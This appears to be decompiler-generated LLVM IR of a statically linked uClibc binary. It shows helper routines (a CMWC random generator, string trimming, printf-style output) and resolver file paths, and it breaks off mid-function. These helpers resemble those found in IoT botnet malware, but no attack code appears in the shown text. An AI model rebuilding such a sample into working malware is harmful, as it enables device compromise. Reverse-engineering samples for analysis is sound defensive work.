@global_var_80646d0.564 = local_unnamed_addr global i32 0
@global_var_80646c8.565 = local_unnamed_addr global i32 0
@global_var_8055723.567 = constant i32 1928542531
@global_var_8055747.568 = constant i32 1928542531
@global_var_8064704.569 = local_unnamed_addr global i32 0
@global_var_80646e4.570 = global i32 0
@global_var_805d370.572 = constant [4 x i8] c"inf\00"
@global_var_805d373.577 = constant i32 1179535616
@global_var_805d380.578 = constant i32 2883630
@global_var_8064b38.582 = local_unnamed_addr global i32 0
@global_var_805d43c.583 = constant i32 1697579054
@global_var_805d470.584 = constant i32 1868824690
@global_var_805d43e.585 = constant [17 x i8] c"/etc/resolv.conf\00"
@global_var_805d44f.586 = constant [24 x i8] c"/etc/config/resolv.conf\00"
@global_var_805d467.587 = constant [11 x i8] c"nameserver\00"
@global_var_805d472.588 = constant [7 x i8] c"domain\00"
@global_var_805d479.589 = constant [7 x i8] c"search\00"
@global_var_8064b18.590 = global i32 0
@global_var_8064b3c.591 = local_unnamed_addr global i32 0
@global_var_8064b40.592 = local_unnamed_addr global i32 0
@global_var_80624a4.593 = local_unnamed_addr global i32 0
@global_var_80624a8.594 = local_unnamed_addr global i32 0
@global_var_805e23c.595 = local_unnamed_addr global i32 2
@global_var_805d494.596 = constant [17 x i8] c"0123456789abcdef\00"
@global_var_805d491.598 = constant [3 x i8] c"%x\00"
@global_var_805d4a5.599 = constant [11 x i8] c"/etc/hosts\00"
@global_var_805d4b0.600 = constant [18 x i8] c"/etc/config/hosts\00"
@global_var_805e460.1 = local_unnamed_addr global i8 0
@global_var_80624a0.13 = external local_unnamed_addr global i8*
@global_var_805e480.20 = external local_unnamed_addr global i8*
@global_var_805e497.27 = local_unnamed_addr global i8 0
@global_var_805e498.28 = local_unnamed_addr global i8 0
@global_var_805e499.29 = local_unnamed_addr global i8 0
@global_var_805e49a.30 = local_unnamed_addr global i8 0
@global_var_805e496.229 = local_unnamed_addr global i8 0
@global_var_805e490.461 = external global i8*
@global_var_805e240.481 = global i16 288
@global_var_805e290.482 = local_unnamed_addr global i16 272
@global_var_805c18a.492 = external constant i8*
@global_var_80647a0.522 = global i8 0
@global_var_8064b00.538 = local_unnamed_addr global i8 0
@global_var_80646c0.543 = local_unnamed_addr global i8 0
@global_var_80646dc.563 = local_unnamed_addr global i8 0
@global_var_805d3a0.575 = constant x86_fp80* null
@global_var_80646e8.579 = external global i8*
@global_var_8064700.580 = local_unnamed_addr global i64 0
@global_var_805e444.581 = local_unnamed_addr global i16 1
@global_var_805bac4.477 = constant [2 x i8] c"r\00"

declare void @__pseudo_call(i32) local_unnamed_addr

declare void @__pseudo_cond_branch(i1, i32) local_unnamed_addr

define i32 @_init() local_unnamed_addr {
entry:
  %v0_8048097 = load i32, i32* @ebx, align 4
  %v1_8048098 = call i32 @__get_pc_thunk_bx(i32 %v0_8048097)
  %v0_804809d = load i32, i32* @ebx, align 4
  %v1_804809d = add i32 %v0_804809d, 89975
  store i32 %v1_804809d, i32* @ebx, align 4
  %v0_80480a3 = call i32 @frame_dummy()
  %v0_80480a8 = call i32 @__do_global_ctors_aux()
  ret i32 %v0_80480a8
}

define i32 @__get_pc_thunk_bx(i32 %arg1) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @ebx, align 4
  %v0_80480b3 = load i32, i32* @eax, align 4
  ret i32 %v0_80480b3
}

define i32 @__do_global_dtors_aux() local_unnamed_addr {
entry:
  %v0_80480c6 = load i8, i8* @global_var_805e460.1, align 32
  %v1_80480c6 = icmp eq i8 %v0_80480c6, 0
  br i1 %v1_80480c6, label %dec_label_pc_80480db.preheader, label %entry.dec_label_pc_8048102_crit_edge

entry.dec_label_pc_8048102_crit_edge:             ; preds = %entry
  %v0_8048103.pre = load i32, i32* @eax, align 4
  br label %dec_label_pc_8048102

dec_label_pc_80480db.preheader:                   ; preds = %entry
  %v0_80480db1 = load i32, i32* bitcast (i32** @global_var_805e024.3 to i32*), align 4
  %v1_80480e22 = icmp eq i32 %v0_80480db1, 0
  %v1_80480e49 = icmp eq i1 %v1_80480e22, false
  br i1 %v1_80480e49, label %dec_label_pc_80480d1.lr.ph, label %dec_label_pc_80480e6

dec_label_pc_80480d1.lr.ph:                       ; preds = %dec_label_pc_80480db.preheader
  br label %dec_label_pc_80480d1

dec_label_pc_80480d1:                             ; preds = %dec_label_pc_80480d1.lr.ph, %dec_label_pc_80480d1
  %v0_80480d1 = phi i32 [ %v0_80480db1, %dec_label_pc_80480d1.lr.ph ], [ %v0_80480db, %dec_label_pc_80480d1 ]
  %v1_80480d1 = add i32 %v0_80480d1, 4
  store i32 %v1_80480d1, i32* bitcast (i32** @global_var_805e024.3 to i32*), align 4
  call void @__pseudo_call(i32 %v0_80480d1)
  %v0_80480db = load i32, i32* bitcast (i32** @global_var_805e024.3 to i32*), align 4
  %v1_80480e2 = icmp eq i32 %v0_80480db, 0
  %v1_80480e4 = icmp eq i1 %v1_80480e2, false
  br i1 %v1_80480e4, label %dec_label_pc_80480d1, label %dec_label_pc_80480db.dec_label_pc_80480e6_crit_edge

dec_label_pc_80480db.dec_label_pc_80480e6_crit_edge: ; preds = %dec_label_pc_80480d1
  br label %dec_label_pc_80480e6

dec_label_pc_80480e6:                             ; preds = %dec_label_pc_80480db.dec_label_pc_80480e6_crit_edge, %dec_label_pc_80480db.preheader
  store i8 1, i8* @global_var_805e460.1, align 32
  br label %dec_label_pc_8048102

dec_label_pc_8048102:                             ; preds = %entry.dec_label_pc_8048102_crit_edge, %dec_label_pc_80480e6
  %v0_8048103 = phi i32 [ %v0_8048103.pre, %entry.dec_label_pc_8048102_crit_edge ], [ 0, %dec_label_pc_80480e6 ]
  ret i32 %v0_8048103

; uselistorder directives
  uselistorder i32 %v0_80480db, { 1, 0 }
  uselistorder i32 %v0_80480d1, { 1, 0 }
  uselistorder i32* bitcast (i32** @global_var_805e024.3 to i32*), { 1, 2, 0 }
  uselistorder i8* @global_var_805e460.1, { 1, 0 }
  uselistorder label %dec_label_pc_8048102, { 1, 0 }
  uselistorder label %dec_label_pc_80480d1, { 1, 0 }
}

define i32 @frame_dummy() local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  %v0_8048110 = load i32, i32* @ebp, align 4
  store i32 %v0_8048110, i32* %stack_var_-4, align 4
  %v4_8048110 = ptrtoint i32* %stack_var_-4 to i32
  store i32 0, i32* @eax, align 4
  store i32 %v4_8048110, i32* @ebp, align 4
  %v0_804811b = call i32 @function_8048120()
  ret i32 %v0_804811b

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 1, 0 }
}

define i32 @function_8048120() local_unnamed_addr {
dec_label_pc_8048120:
  %v0_8048127 = load i32, i32* @eax, align 4
  %v1_8048127 = icmp eq i32 %v0_8048127, 0
  br i1 %v1_8048127, label %dec_label_pc_804814a, label %dec_label_pc_804812b

dec_label_pc_804812b:                             ; preds = %dec_label_pc_8048120
  %v1_8048145 = call i32 @unknown_0(i32 ptrtoint (i32* @global_var_805d4c4.4 to i32))
  br label %dec_label_pc_804814a

dec_label_pc_804814a:                             ; preds = %dec_label_pc_8048120, %dec_label_pc_804812b
  %v0_804814a = load i32, i32* @global_var_805e010.6, align 16
  %v1_804814f = icmp eq i32 %v0_804814a, 0
  br i1 %v1_804814f, label %dec_label_pc_8048165, label %dec_label_pc_8048153

dec_label_pc_8048153:                             ; preds = %dec_label_pc_804814a
  br label %dec_label_pc_8048165

dec_label_pc_8048165:                             ; preds = %dec_label_pc_8048153, %dec_label_pc_804814a
  ret i32 0

; uselistorder directives
  uselistorder label %dec_label_pc_804814a, { 1, 0 }
}

define i32 @_start(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  %stack_var_4 = alloca i32, align 4
  store i32 %arg1, i32* @esi, align 4
  %v4_804816a = ptrtoint i32* %stack_var_4 to i32
  %v0_8048170 = load i32, i32* @eax, align 4
  store i32 %v0_8048170, i32* %stack_var_-4, align 4
  %v4_8048170 = ptrtoint i32* %stack_var_-4 to i32
  %v0_8048172 = load i32, i32* @edx, align 4
  %v8_8048184 = inttoptr i32 %arg1 to i32*
  %v9_8048184 = call i32 @__uClibc_main(i32 134551046, i32* %v8_8048184, i32 %v4_804816a, i32 134512788, i32 134580916, i32 %v0_8048172, i32 %v4_8048170, i32 %v0_8048170)
  ret i32 %v9_8048184

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 1, 0 }
}

define i32 @init_rand(i32 %arg1) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* @global_var_805e4a0.7, align 32
  %v1_804819d = add i32 %arg1, -1640531527
  store i32 %v1_804819d, i32* @global_var_805e4a4.8, align 4
  %v1_80481aa = add i32 %arg1, 1013904242
  store i32 %v1_80481aa, i32* %eax.global-to-local, align 4
  store i32 %v1_80481aa, i32* @global_var_805e4a8.9, align 8
  br label %dec_label_pc_80481bd

dec_label_pc_80481bd:                             ; preds = %entry, %dec_label_pc_80481bd
  %storemerge5 = phi i32 [ 3, %entry ], [ %v4_80481ed, %dec_label_pc_80481bd ]
  %v1_80481c3 = add nsw i32 %storemerge5, -3
  store i32 %v1_80481c3, i32* %eax.global-to-local, align 4
  %v1_80481c6 = mul nuw nsw i32 %v1_80481c3, 4
  %v2_80481c6 = add i32 %v1_80481c6, ptrtoint (i32* @global_var_805e4a0.7 to i32)
  %v3_80481c6 = inttoptr i32 %v2_80481c6 to i32*
  %v4_80481c6 = load i32, i32* %v3_80481c6, align 4
  %v1_80481d0 = add nsw i32 %storemerge5, -2
  store i32 %v1_80481d0, i32* %eax.global-to-local, align 4
  %v1_80481d3 = mul nuw nsw i32 %v1_80481d0, 4
  %v2_80481d3 = add i32 %v1_80481d3, ptrtoint (i32* @global_var_805e4a0.7 to i32)
  %v3_80481d3 = inttoptr i32 %v2_80481d3 to i32*
  %v4_80481d3 = load i32, i32* %v3_80481d3, align 4
  %v2_80481da = xor i32 %v4_80481d3, %v4_80481c6
  %v2_80481df = xor i32 %storemerge5, -1640531527
  %v1_80481e1 = xor i32 %v2_80481df, %v2_80481da
  store i32 %v1_80481e1, i32* %eax.global-to-local, align 4
  %v2_80481e6 = mul nuw nsw i32 %storemerge5, 4
  %v3_80481e6 = add i32 %v2_80481e6, ptrtoint (i32* @global_var_805e4a0.7 to i32)
  %v4_80481e6 = inttoptr i32 %v3_80481e6 to i32*
  store i32 %v1_80481e1, i32* %v4_80481e6, align 4
  %v4_80481ed = add nuw nsw i32 %storemerge5, 1
  %exitcond = icmp eq i32 %v4_80481ed, 4096
  br i1 %exitcond, label %dec_label_pc_80481f9, label %dec_label_pc_80481bd

dec_label_pc_80481f9:                             ; preds = %dec_label_pc_80481bd
  %v0_80481fa = load i32, i32* %eax.global-to-local, align 4
  ret i32 %v0_80481fa

; uselistorder directives
  uselistorder i32 %storemerge5, { 2, 3, 4, 1, 0 }
  uselistorder i32 %arg1, { 2, 1, 0 }
  uselistorder label %dec_label_pc_80481bd, { 1, 0 }
}

define i32 @rand_cmwc(i32 %arg1) local_unnamed_addr {
entry:
  %v0_8048217 = load i32, i32* @global_var_805e0f8.10, align 8
  %v1_804821c = add i32 %v0_8048217, 1
  %v1_804821d = urem i32 %v1_804821c, 4096
  store i32 %v1_804821d, i32* @global_var_805e0f8.10, align 8
  %v1_804822c = mul nuw nsw i32 %v1_804821d, 4
  %v2_804822c = add i32 %v1_804822c, ptrtoint (i32* @global_var_805e4a0.7 to i32)
  %v3_804822c = inttoptr i32 %v2_804822c to i32*
  %v4_804822c = load i32, i32* %v3_804822c, align 4
  %v7_8048249 = udiv i32 %v4_804822c, 228675
  store i32 %v7_8048249, i32* @global_var_805e0f4.11, align 4
  br i1 true, label %dec_label_pc_8048299, label %dec_label_pc_804828b

dec_label_pc_804828b:                             ; preds = %entry
  br label %dec_label_pc_8048299

dec_label_pc_8048299:                             ; preds = %entry, %dec_label_pc_804828b
  %v1_80482ae = mul nuw nsw i32 %v1_804821d, 4
  %v2_80482ae = add i32 %v1_80482ae, ptrtoint (i32* @global_var_805e4a0.7 to i32)
  %v3_80482ae = inttoptr i32 %v2_80482ae to i32*
  %v4_80482ae = load i32, i32* %v3_80482ae, align 4
  ret i32 %v4_80482ae

; uselistorder directives
  uselistorder i32 %v1_804821d, { 0, 2, 1 }
  uselistorder label %dec_label_pc_8048299, { 1, 0 }
}

define i32 @trim(i8* %arg1) local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  %v0_80482be = load i32, i32* @edi, align 4
  store i32 %v0_80482be, i32* %stack_var_-8, align 4
  %v4_80482c9 = ptrtoint i8* %arg1 to i32
  store i1 false, i1* @df, align 1
  %v3_80482da = call i32 @_strlen(i8* %arg1)
  %v1_80482e1 = add i32 %v3_80482da, -1
  br label %dec_label_pc_80482ea

dec_label_pc_80482e7:                             ; preds = %dec_label_pc_80482ea
  %v4_80482e7 = add i32 %stack_var_-16.0, 1
  br label %dec_label_pc_80482ea

dec_label_pc_80482ea:                             ; preds = %entry, %dec_label_pc_80482e7
  %stack_var_-16.0 = phi i32 [ 0, %entry ], [ %v4_80482e7, %dec_label_pc_80482e7 ]
  %v6_80482ed = add i32 %stack_var_-16.0, %v4_80482c9
  %v1_80482f0 = inttoptr i32 %v6_80482ed to i8*
  %v2_80482f0 = load i8, i8* %v1_80482f0, align 1
  %v2_80482f3 = sext i8 %v2_80482f0 to i32
  %v1_80482f9 = call i32 @isspace(i32 %v2_80482f3)
  %v1_80482fe = icmp eq i32 %v1_80482f9, 0
  %v1_8048300 = icmp eq i1 %v1_80482fe, false
  br i1 %v1_8048300, label %dec_label_pc_80482e7, label %dec_label_pc_8048307.preheader

dec_label_pc_8048307.preheader:                   ; preds = %dec_label_pc_80482ea
  %v5_804830d19 = icmp slt i32 %v1_80482e1, %stack_var_-16.0
  br i1 %v5_804830d19, label %dec_label_pc_8048327, label %dec_label_pc_804830f

dec_label_pc_8048304:                             ; preds = %dec_label_pc_804830f
  %v4_8048304 = add i32 %stack_var_-12.020, -1
  %v5_804830d = icmp slt i32 %v4_8048304, %stack_var_-16.0
  br i1 %v5_804830d, label %dec_label_pc_8048327, label %dec_label_pc_804830f

dec_label_pc_804830f:                             ; preds = %dec_label_pc_8048307.preheader, %dec_label_pc_8048304
  %stack_var_-12.020 = phi i32 [ %v4_8048304, %dec_label_pc_8048304 ], [ %v1_80482e1, %dec_label_pc_8048307.preheader ]
  %v6_8048312 = add i32 %stack_var_-12.020, %v4_80482c9
  %v1_8048315 = inttoptr i32 %v6_8048312 to i8*
  %v2_8048315 = load i8, i8* %v1_8048315, align 1
  %v2_8048318 = sext i8 %v2_8048315 to i32
  %v1_804831e = call i32 @isspace(i32 %v2_8048318)
  %v1_8048323 = icmp eq i32 %v1_804831e, 0
  %v1_8048325 = icmp eq i1 %v1_8048323, false
  br i1 %v1_8048325, label %dec_label_pc_8048304, label %dec_label_pc_8048327

dec_label_pc_8048327:                             ; preds = %dec_label_pc_8048304, %dec_label_pc_804830f, %dec_label_pc_8048307.preheader
  %stack_var_-12.0.lcssa = phi i32 [ %v1_80482e1, %dec_label_pc_8048307.preheader ], [ %stack_var_-12.020, %dec_label_pc_804830f ], [ %v4_8048304, %dec_label_pc_8048304 ]
  br label %dec_label_pc_804834a

dec_label_pc_804832f:                             ; preds = %dec_label_pc_804834a
  %v6_804833f = add i32 %storemerge, %v4_80482c9
  %v1_8048342 = inttoptr i32 %v6_804833f to i8*
  %v2_8048342 = load i8, i8* %v1_8048342, align 1
  %v3_8048345 = inttoptr i32 %v6_804835a to i8*
  store i8 %v2_8048342, i8* %v3_8048345, align 1
  %v4_8048347 = add i32 %storemerge, 1
  br label %dec_label_pc_804834a

dec_label_pc_804834a:                             ; preds = %dec_label_pc_8048327, %dec_label_pc_804832f
  %storemerge = phi i32 [ %v4_8048347, %dec_label_pc_804832f ], [ %stack_var_-16.0, %dec_label_pc_8048327 ]
  %v7_8048350 = icmp sgt i32 %storemerge, %stack_var_-12.0.lcssa
  %v2_8048358 = sub i32 %storemerge, %stack_var_-16.0
  %v6_804835a = add i32 %v2_8048358, %v4_80482c9
  br i1 %v7_8048350, label %dec_label_pc_8048352, label %dec_label_pc_804832f

dec_label_pc_8048352:                             ; preds = %dec_label_pc_804834a
  %v22_804835a = inttoptr i32 %v6_804835a to i8*
  store i8 0, i8* %v22_804835a, align 1
  %v2_8048363 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_8048363, i32* @edi, align 4
  ret i32 %v6_804835a

; uselistorder directives
  uselistorder i32 %storemerge, { 2, 3, 0, 1 }
  uselistorder i32 %stack_var_-12.020, { 0, 2, 1 }
  uselistorder i32 %v1_80482e1, { 2, 1, 0 }
  uselistorder i32 (i32)* @isspace, { 1, 0 }
  uselistorder i8* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_804834a, { 1, 0 }
  uselistorder label %dec_label_pc_8048327, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804830f, { 1, 0 }
  uselistorder label %dec_label_pc_80482ea, { 1, 0 }
}

define i32 @printchar(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_8 = alloca i8, align 1
  %tmp8 = trunc i32 %arg2 to i8
  store i8 %tmp8, i8* %stack_var_8, align 1
  %v4_804836c = icmp eq i32* %arg1, null
  br i1 %v4_804836c, label %dec_label_pc_804838b, label %dec_label_pc_8048372

dec_label_pc_8048372:                             ; preds = %entry
  %tmp5 = ptrtoint i32* %arg1 to i32
  %v2_8048375 = load i32, i32* %arg1, align 4
  %v3_804837a = inttoptr i32 %v2_8048375 to i8*
  store i8 %tmp8, i8* %v3_804837a, align 1
  %v2_804837f = load i32, i32* %arg1, align 4
  %v1_8048381 = add i32 %v2_804837f, 1
  store i32 %v1_8048381, i32* @edx, align 4
  store i32 %v1_8048381, i32* %arg1, align 4
  br label %dec_label_pc_80483a6

dec_label_pc_804838b:                             ; preds = %entry
  %v3_80483a1 = bitcast i8* %stack_var_8 to i32*
  %v4_80483a1 = call i32 @__libc_write(i32 1, i32* %v3_80483a1, i32 1)
  br label %dec_label_pc_80483a6

dec_label_pc_80483a6:                             ; preds = %dec_label_pc_8048372, %dec_label_pc_804838b
  %v0_80483a7 = phi i32 [ %tmp5, %dec_label_pc_8048372 ], [ %v4_80483a1, %dec_label_pc_804838b ]
  ret i32 %v0_80483a7

; uselistorder directives
  uselistorder i32* %arg1, { 0, 1, 2, 4, 3 }
  uselistorder label %dec_label_pc_80483a6, { 1, 0 }
}

define i32 @prints(i32 %arg1, i8* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %tmp13 = icmp slt i32 %arg3, 1
  br i1 %tmp13, label %dec_label_pc_8048409, label %dec_label_pc_80483c2

dec_label_pc_80483c2:                             ; preds = %entry
  %v4_80483c9 = ptrtoint i8* %arg2 to i32
  store i32 %v4_80483c9, i32* @edx, align 4
  %v2_80483da45 = load i8, i8* %arg2, align 1
  %v4_80483dd47 = icmp eq i8 %v2_80483da45, 0
  %v1_80483df49 = icmp eq i1 %v4_80483dd47, false
  br i1 %v1_80483df49, label %dec_label_pc_80483d1, label %dec_label_pc_80483e1

dec_label_pc_80483d1:                             ; preds = %dec_label_pc_80483c2, %dec_label_pc_80483d1
  %v4_80483d751 = phi i32 [ %v5_80483d4, %dec_label_pc_80483d1 ], [ %v4_80483c9, %dec_label_pc_80483c2 ]
  %stack_var_-12.050 = phi i32 [ %v4_80483d1, %dec_label_pc_80483d1 ], [ 0, %dec_label_pc_80483c2 ]
  %v4_80483d1 = add i32 %stack_var_-12.050, 1
  %v5_80483d4 = add i32 %v4_80483d751, 1
  %v22_80483d4 = inttoptr i32 %v5_80483d4 to i8*
  store i32 %v5_80483d4, i32* @edx, align 4
  %v2_80483da = load i8, i8* %v22_80483d4, align 1
  %v4_80483dd = icmp eq i8 %v2_80483da, 0
  %v1_80483df = icmp eq i1 %v4_80483dd, false
  br i1 %v1_80483df, label %dec_label_pc_80483d1, label %dec_label_pc_80483e1

dec_label_pc_80483e1:                             ; preds = %dec_label_pc_80483d1, %dec_label_pc_80483c2
  %stack_var_-12.0.lcssa = phi i32 [ 0, %dec_label_pc_80483c2 ], [ %v4_80483d1, %dec_label_pc_80483d1 ]
  %v5_80483e7 = icmp slt i32 %stack_var_-12.0.lcssa, %arg3
  br i1 %v5_80483e7, label %dec_label_pc_80483f2, label %dec_label_pc_80483f8

dec_label_pc_80483f2:                             ; preds = %dec_label_pc_80483e1
  store i32 %stack_var_-12.0.lcssa, i32* @edx, align 4
  %v5_80483f5 = sub i32 %arg3, %stack_var_-12.0.lcssa
  br label %dec_label_pc_80483f8

dec_label_pc_80483f8:                             ; preds = %dec_label_pc_80483e1, %dec_label_pc_80483f2
  %storemerge = phi i32 [ %v5_80483f5, %dec_label_pc_80483f2 ], [ 0, %dec_label_pc_80483e1 ]
  %v1_80483fb = and i32 %arg4, 2
  %tmp14 = mul nuw nsw i32 %v1_80483fb, 8
  %tmp15 = or i32 %tmp14, 32
  br label %dec_label_pc_8048409

dec_label_pc_8048409:                             ; preds = %dec_label_pc_80483f8, %entry
  %stack_var_12.0 = phi i32 [ %arg3, %entry ], [ %storemerge, %dec_label_pc_80483f8 ]
  %stack_var_-16.0 = phi i32 [ 32, %entry ], [ %tmp15, %dec_label_pc_80483f8 ]
  %v1_804840c = urem i32 %arg4, 2
  %v2_804840c = icmp eq i32 %v1_804840c, 0
  %v1_8048411 = icmp eq i1 %v2_804840c, false
  %.pre = inttoptr i32 %arg1 to i32*
  br i1 %v1_8048411, label %dec_label_pc_8048453.preheader, label %dec_label_pc_804842d.preheader

dec_label_pc_804842d.preheader:                   ; preds = %dec_label_pc_8048409
  %tmp1638 = icmp slt i32 %stack_var_12.0, 1
  %tmp1739 = icmp eq i1 %tmp1638, false
  br i1 %tmp1739, label %dec_label_pc_8048415, label %dec_label_pc_8048453.preheader

dec_label_pc_8048415:                             ; preds = %dec_label_pc_804842d.preheader, %dec_label_pc_8048415
  %stack_var_-20.041 = phi i32 [ %v4_8048427, %dec_label_pc_8048415 ], [ 0, %dec_label_pc_804842d.preheader ]
  %stack_var_12.140 = phi i32 [ %v4_804842a, %dec_label_pc_8048415 ], [ %stack_var_12.0, %dec_label_pc_804842d.preheader ]
  %v3_8048422 = call i32 @printchar(i32* %.pre, i32 %stack_var_-16.0)
  %v4_8048427 = add i32 %stack_var_-20.041, 1
  %v4_804842a = add i32 %stack_var_12.140, -1
  %tmp16 = icmp slt i32 %v4_804842a, 1
  %tmp17 = icmp eq i1 %tmp16, false
  br i1 %tmp17, label %dec_label_pc_8048415, label %dec_label_pc_8048453.preheader

dec_label_pc_8048453.preheader:                   ; preds = %dec_label_pc_804842d.preheader, %dec_label_pc_8048415, %dec_label_pc_8048409
  %stack_var_12.2.ph = phi i32 [ %stack_var_12.0, %dec_label_pc_8048409 ], [ %stack_var_12.0, %dec_label_pc_804842d.preheader ], [ %v4_804842a, %dec_label_pc_8048415 ]
  %stack_var_-20.1.ph = phi i32 [ 0, %dec_label_pc_8048409 ], [ 0, %dec_label_pc_804842d.preheader ], [ %v4_8048427, %dec_label_pc_8048415 ]
  %v4_804845326 = ptrtoint i8* %arg2 to i32
  %v2_804845627 = load i8, i8* %arg2, align 1
  %v4_804845929 = icmp eq i8 %v2_804845627, 0
  %v1_804845b31 = icmp eq i1 %v4_804845929, false
  br i1 %v1_804845b31, label %dec_label_pc_8048435, label %dec_label_pc_8048477.preheader

dec_label_pc_8048435:                             ; preds = %dec_label_pc_8048453.preheader, %dec_label_pc_8048435
  %v4_804845334 = phi i32 [ %v5_8048450, %dec_label_pc_8048435 ], [ %v4_804845326, %dec_label_pc_8048453.preheader ]
  %stack_var_-20.133 = phi i32 [ %v4_804844d, %dec_label_pc_8048435 ], [ %stack_var_-20.1.ph, %dec_label_pc_8048453.preheader ]
  %stack_var_8.032 = phi i8* [ %v22_8048450, %dec_label_pc_8048435 ], [ %arg2, %dec_label_pc_8048453.preheader ]
  %v2_8048438 = load i8, i8* %stack_var_8.032, align 1
  %v3_8048438 = zext i8 %v2_8048438 to i32
  %v3_8048448 = call i32 @printchar(i32* %.pre, i32 %v3_8048438)
  %v4_804844d = add i32 %stack_var_-20.133, 1
  %v5_8048450 = add i32 %v4_804845334, 1
  %v22_8048450 = inttoptr i32 %v5_8048450 to i8*
  %v2_8048456 = load i8, i8* %v22_8048450, align 1
  %v4_8048459 = icmp eq i8 %v2_8048456, 0
  %v1_804845b = icmp eq i1 %v4_8048459, false
  br i1 %v1_804845b, label %dec_label_pc_8048435, label %dec_label_pc_8048477.preheader

dec_label_pc_8048477.preheader:                   ; preds = %dec_label_pc_8048435, %dec_label_pc_8048453.preheader
  %stack_var_-20.1.lcssa = phi i32 [ %stack_var_-20.1.ph, %dec_label_pc_8048453.preheader ], [ %v4_804844d, %dec_label_pc_8048435 ]
  %tmp1822 = icmp slt i32 %stack_var_12.2.ph, 1
  %tmp1923 = icmp eq i1 %tmp1822, false
  br i1 %tmp1923, label %dec_label_pc_804845f, label %dec_label_pc_804847d

dec_label_pc_804845f:                             ; preds = %dec_label_pc_8048477.preheader, %dec_label_pc_804845f
  %stack_var_-20.225 = phi i32 [ %v4_8048471, %dec_label_pc_804845f ], [ %stack_var_-20.1.lcssa, %dec_label_pc_8048477.preheader ]
  %stack_var_12.324 = phi i32 [ %v4_8048474, %dec_label_pc_804845f ], [ %stack_var_12.2.ph, %dec_label_pc_8048477.preheader ]
  %v3_804846c = call i32 @printchar(i32* %.pre, i32 %stack_var_-16.0)
  %v4_8048471 = add i32 %stack_var_-20.225, 1
  %v4_8048474 = add i32 %stack_var_12.324, -1
  %tmp18 = icmp slt i32 %v4_8048474, 1
  %tmp19 = icmp eq i1 %tmp18, false
  br i1 %tmp19, label %dec_label_pc_804845f, label %dec_label_pc_804847d

dec_label_pc_804847d:                             ; preds = %dec_label_pc_804845f, %dec_label_pc_8048477.preheader
  %stack_var_-20.2.lcssa = phi i32 [ %stack_var_-20.1.lcssa, %dec_label_pc_8048477.preheader ], [ %v4_8048471, %dec_label_pc_804845f ]
  ret i32 %stack_var_-20.2.lcssa

; uselistorder directives
  uselistorder i32 %v4_8048474, { 1, 0 }
  uselistorder i8* %v22_8048450, { 1, 0 }
  uselistorder i32 %v5_8048450, { 1, 0 }
  uselistorder i32 %v4_804842a, { 0, 2, 1 }
  uselistorder i32 %stack_var_-16.0, { 1, 0 }
  uselistorder i32 %stack_var_-12.0.lcssa, { 1, 2, 0 }
  uselistorder i32 %v5_80483d4, { 1, 2, 0 }
  uselistorder i32 %arg3, { 3, 1, 2, 0 }
  uselistorder i8* %arg2, { 0, 2, 3, 1, 4 }
  uselistorder label %dec_label_pc_804845f, { 1, 0 }
  uselistorder label %dec_label_pc_8048435, { 1, 0 }
  uselistorder label %dec_label_pc_8048453.preheader, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8048415, { 1, 0 }
  uselistorder label %dec_label_pc_80483f8, { 1, 0 }
  uselistorder label %dec_label_pc_80483d1, { 1, 0 }
}

define i32 @printi(i32 %arg1, i64 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
entry:
  %stack_var_-5 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v4_8048496 = trunc i64 %arg2 to i32
  %v5_804849c = icmp eq i32 %v4_8048496, 0
  %v6_804849c = icmp slt i32 %v4_8048496, 0
  %v1_80484a0 = icmp eq i1 %v5_804849c, false
  br i1 %v1_80484a0, label %dec_label_pc_80484d2, label %dec_label_pc_80484a2

dec_label_pc_80484a2:                             ; preds = %entry
  store i32 48, i32* %stack_var_-16, align 4
  %tmp42 = bitcast i32* %stack_var_-16 to i8*
  %v6_80484c5 = call i32 @prints(i32 %arg1, i8* %tmp42, i32 %arg5, i32 %arg6)
  br label %dec_label_pc_80485bc

dec_label_pc_80484d2:                             ; preds = %entry
  %v4_80484d2 = icmp eq i32 %arg4, 0
  br i1 %v4_80484d2, label %dec_label_pc_80484f3, label %dec_label_pc_80484d8

dec_label_pc_80484d8:                             ; preds = %dec_label_pc_80484d2
  %v13_80484d8 = icmp eq i32 %arg3, 10
  %v1_80484dc = icmp eq i1 %v13_80484d8, false
  br i1 %v1_80484dc, label %dec_label_pc_80484f3, label %dec_label_pc_80484de

dec_label_pc_80484de:                             ; preds = %dec_label_pc_80484d8
  %v1_80484e2 = icmp eq i1 %v6_804849c, false
  br i1 %v1_80484e2, label %dec_label_pc_80484f3, label %dec_label_pc_80484e4

dec_label_pc_80484e4:                             ; preds = %dec_label_pc_80484de
  %v1_80484ee = sub i32 0, %v4_8048496
  %v5_80484f0 = sext i32 %v1_80484ee to i64
  br label %dec_label_pc_80484f3

dec_label_pc_80484f3:                             ; preds = %dec_label_pc_80484de, %dec_label_pc_80484d8, %dec_label_pc_80484d2, %dec_label_pc_80484e4
  %stack_var_-24.0 = phi i64 [ %arg2, %dec_label_pc_80484d2 ], [ %arg2, %dec_label_pc_80484d8 ], [ %arg2, %dec_label_pc_80484de ], [ %v5_80484f0, %dec_label_pc_80484e4 ]
  %stack_var_-32.0 = phi i32 [ 0, %dec_label_pc_80484d2 ], [ 0, %dec_label_pc_80484d8 ], [ 0, %dec_label_pc_80484de ], [ 1, %dec_label_pc_80484e4 ]
  %tmp43 = bitcast i32* %stack_var_-5 to i8*
  store i8 0, i8* %tmp43, align 4
  %v4_80485548 = trunc i64 %stack_var_-24.0 to i32
  %v5_80485549 = icmp eq i32 %v4_80485548, 0
  %v1_804855816 = icmp eq i1 %v5_80485549, false
  br i1 %v1_804855816, label %dec_label_pc_8048504.lr.ph, label %dec_label_pc_804855a

